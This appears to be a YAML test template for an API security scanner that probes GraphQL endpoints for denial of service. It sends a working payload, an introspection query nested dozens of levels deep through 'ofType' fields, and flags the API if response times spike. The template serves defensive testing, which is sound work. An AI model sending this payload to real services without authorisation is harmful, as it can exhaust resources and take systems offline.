id: GRAPHQL_DOS_QUERY_DEPTH_CHECK
info:
  name: "Denial of Service Test on GraphQL API with very Deeply nested query with default schema fields in a request"
  description: "This test involves creating a query with excessive nesting of default schema fields to test the server's resilience. This helps identify if the API can handle complex queries without performance degradation or crashing, ensuring robustness against potential DoS attacks."
  details: "This test examines the server's ability to handle highly complex queries by excessively nesting fields like `__schema` and `ofType`. This test helps identify if the API can manage deep queries without performance issues or crashes, ensuring it is robust against DoS attacks that exploit query depth and complexity."
  impact: "Conducting this test can reveal vulnerabilities that may lead to significant performance degradation or complete server crashes. Identifying these issues helps in implementing necessary limits and protections, thereby enhancing the API's resilience against potential DoS attacks that exploit query complexity. This ensures the API remains stable and reliable under various conditions."
  category:
    name: RL
    shortName: Lack of Resources & Rate Limiting
    displayName: Lack of Resources & Rate Limiting (RL)
  subCategory: GRAPHQL_DOS_QUERY_DEPTH_CHECK
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa4-unrestricted-resource-consumption.md"
  cwe:
    - CWE-400
  cve:
    - CVE-2023-4647
    - CVE-2023-38254

attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: SLOW
compliance_standards: compliance/dos.conf

api_selection_filters:
  method:
    neq: "OPTIONS"
  url:
    regex: graphql
  response_payload:
    length:
      gt: 0
    not_contains:
      - error
      - issue
      - UserNotAuthorizedError
      - INTERNAL_SERVER_ERROR
      - "GRAPHQL_VALIDATION_FAILED"
      - "graphQL syntax error"
      - "Syntax Error: Expected Name, found <EOF>."
      - "GRAPHQL_PARSE_FAILED"
      - "Bad Request"

execute:
  type: multiple
  requests:
    - req:
        - add_header:
            dummyKey: dummyVal
        - validate:
            response_payload:
              percentage_match:
                gte: 80
        - success: x2
        - failure: exit

    - req:
        - replace_body: '[{ "operationName":"depthCheck", "query": "query depthCheck{ __schema{ types{        kind        name        ofType{          kind          ofType{            kind            ofType{              kind              ofType{                kind                ofType{                  kind                  ofType{                    kind                    ofType{                      kind                      ofType{                        kind                        ofType{                          kind                          ofType{                            kind                            ofType{                              kind                              ofType{                                kind                                ofType{                                  kind                                  ofType{                                    kind                                    ofType{                                      kind                                      ofType{                                        kind                                        ofType{                                          kind                                          ofType{                                            kind                                            ofType{                                              kind                                              ofType{                                                kind                                                ofType{                                                  kind                                                  ofType{                                                    kind                                                    ofType{                                                      kind                                                      ofType{                                                        kind                                                        ofType{                                                          kind                                                          ofType{                                                            kind                                                            ofType{                                                              kind                                                              ofType{                                                                kind                                                                ofType{                                                                  kind                                                                  ofType{                                                                    kind                                                                    ofType{                                                                      kind                                                                      ofType{                                                                        kind                                                                        ofType{                                                                          kind                                                                          ofType{                                                                            kind                                                                            ofType{                                                                              kind                                                                              ofType{                                                                                kind                                                                                ofType{                                                                                  kind                                                                                  ofType{                                                                                    kind                                                                                    ofType{                                                                                      kind                                                                                      ofType{                                                                                        kind                                                                                        ofType{                                                                                          kind                                                                                          ofType{                                                                                            kind                                                                                            ofType{                                                                                              kind                                                                                              ofType{                                                                                                kind                                                                                                ofType{                                                                                                  kind                                                                                                }                                                                                              }                                                                                            }                                                                                          }                                                                                        }                                                                                      }                                                                                    }                                                                                  }                                                                                }                                                                              }                                                                            }                                                                          }                                                                        }                                                                                        }                                                                    }                                                                  }                                                                }                                                              }                                                            }                                                          }                                                        }                                                      }                                                    }                                                  }                                                }                                              }                                            }                                          }                                        }                                      }                                    }                                  }                                }                              }                            }                          }                        }                      }                    }                  }                }                }              }            }          }        }      }    }"}]'
        - validate:
            response_code:
              gt: 505

validate:
  and:
    - compare_greater:
        - ${x2.response.stats.median_response_time}
        - 5001
    - compare_greater:
        - ${x2.response.stats.median_response_time}
        - ${x1.response.stats.median_response_time} * 5
strategy:
  run_once: /
